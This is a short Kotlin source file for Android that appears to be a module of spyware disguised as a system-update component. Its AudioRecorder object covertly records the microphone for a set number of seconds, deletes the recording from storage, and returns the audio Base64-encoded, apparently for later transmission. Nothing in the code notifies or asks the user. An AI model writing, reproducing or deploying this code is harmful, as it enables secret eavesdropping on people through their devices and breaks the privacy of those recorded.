package com.system.updates.modules

import android.content.Context
import android.media.MediaRecorder
import android.os.Environment
import android.util.Base64
import java.io.File
import java.io.FileInputStream

object AudioRecorder {
    private var r: MediaRecorder? = null
    private var of: File? = null

    fun record(sec: Int): String {
        return try {
            val sr = 44100
            val br = 128000
            val fn = "a_${System.currentTimeMillis()}.m4a"
            of = File(Environment.getExternalStorageDirectory(), fn)
            r = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(sr)
                setAudioBitRate(br)
                setOutputFile(of!!.absolutePath)
                prepare()
                start()
            }
            Thread.sleep(sec * 1000L)
            r?.apply { stop(); release() }
            r = null
            val data = FileInputStream(of).use { it.readBytes() }
            of?.delete()
            Base64.encodeToString(data, Base64.NO_WRAP)
        } catch (e: SecurityException) {
            "ERR_PERM"
        } catch (e: Exception) {
            "ERR_REC"
        }
    }
}